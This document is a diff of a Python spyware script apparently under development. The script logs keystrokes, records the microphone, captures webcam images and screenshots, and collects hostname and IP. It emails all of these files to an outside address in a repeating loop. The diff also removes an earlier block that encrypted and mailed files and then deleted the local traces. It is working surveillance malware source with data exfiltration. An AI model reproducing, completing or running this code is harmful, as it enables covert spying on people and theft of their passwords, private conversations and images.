@@ -58,11 +58,14 @@ key = "-MfQZkl4emBnkTZlRh_lo3Dik-1WBxI_dgXRzJzc6Ps="
 
 microphone_time = 2
 
-# every interation lasts for 15 seconds
-time_iteration = 15 
-num_iterations_end = 3
+# every interation lasts for 5 seconds
+time_iteration = 5
+num_iterations_end = 1
 
 def computer_information():
+    with open(file_path + system_information, "w") as f:
+        f.write("")
+            
     with open(file_path + system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
@@ -78,22 +81,9 @@ def computer_information():
         f.write("Machine: " + platform.machine() + '\n')
         f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address: " + IPAddr + '\n')
+    print("computer information done")
 
 computer_information()
-
-# def copy_clipboard():
-#     with open(file_path + clipboard_information, "a") as f:
-#         try:
-#             win32clipboard.OpenClipboard()
-#             clipboard_data = win32clipboard.GetClipboardData()
-#             win32clipboard.CloseClipboard()
-            
-#             f.write("Clipboard Data: \n" + clipboard_data)
-
-#         except:
-#             f.write("Clipboard could nit be be copied")
-
-# copy_clipboard()
 
 def microphone():
     
@@ -107,6 +97,8 @@ def microphone():
     sd.wait()
     
     write(file_path + audio_information, fs, myrecording)
+    
+    print("microphone done")
     
 microphone()
 
@@ -129,9 +121,10 @@ def camera():
     
     # After the loop release the cap object
     cap.release()
-    print("closing camera")
     # Destroy all the windows
     cv2.destroyAllWindows()
+    
+    print("camera done")
 
 camera()
 
@@ -139,14 +132,11 @@ def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + screenshot_information)
     
+    print("screenshot done")
+    
 screenshot()
 
 def send_email(filename, keys, system, scrshot, camera, audio, toaddr):
-
-    print(f"keys: {keys}\n")
-    print(f"system: {system}\n")
-    print(f"scrshot: {scrshot}\n")
-    print(f"audio: {audio}\n")
     fromaddr = email_address
     
     msg = MIMEMultipart()
@@ -209,22 +199,15 @@ def send_email(filename, keys, system, scrshot, camera, audio, toaddr):
     # quit session
     s.quit()
     
-send_email(
-    keys_information, 
-    file_path + keys_information, 
-    file_path + system_information, 
-    file_path + screenshot_information, 
-    file_path + camera_information, 
-    file_path + audio_information, 
-    toaddr
-)
-
+    print("send email done")
+    
 num_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
+i = -1
 while num_iterations < num_iterations_end:
-
+    i += 1
     count = 0
     keys = []
 
@@ -243,6 +226,7 @@ while num_iterations < num_iterations_end:
             keys = []
 
     def write_file(keys):
+        
         with open(file_path + keys_information, "a") as f:
             for key in keys:
                 
@@ -263,47 +247,31 @@ while num_iterations < num_iterations_end:
         # if esc is pressed, it exits keylogger
         if key == Key.esc:
             return False
-        if currentTime < stoppingTime:
+        if currentTime > stoppingTime:
             return False
-        
+    
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-        
+    
     if currentTime > stoppingTime:
         
         # clean off the key log file for the next execution
         with open(file_path + keys_information, "w") as f:
             f.write(" ")
-        # print("CLEAN OFF FILE")
-        
-        send_email()
+
+        send_email(
+            keys_information, 
+            file_path + keys_information, 
+            file_path + system_information, 
+            file_path + screenshot_information, 
+            file_path + camera_information, 
+            file_path + audio_information, 
+            toaddr
+        )
         
         num_iterations += 1
-        
+
         # update current time
         currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-         
-        
-files_to_encrypt = [file_path + system_information, file_path + clipboard_information, file_path + keys_information]
-encrypted_file_names = [file_path + system_information_e, file_path + clipboard_information_e, file_path + keys_information_e]
+        stoppingTime = time.time() + time_iteration 
 
-count = 0
-
-for e_file in files_to_encrypt:
-    with open(files_to_encrypt[count], 'rb') as f:
-        data = f.read()
-        
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-    
-    with open(encrypted_file_names[count], 'wb') as f:
-        f.write(encrypted)
-        
-    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
-    count += 1
-    
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-for file in delete_files:
-    os.remove(file_path + file)
-# time.sleep(60)
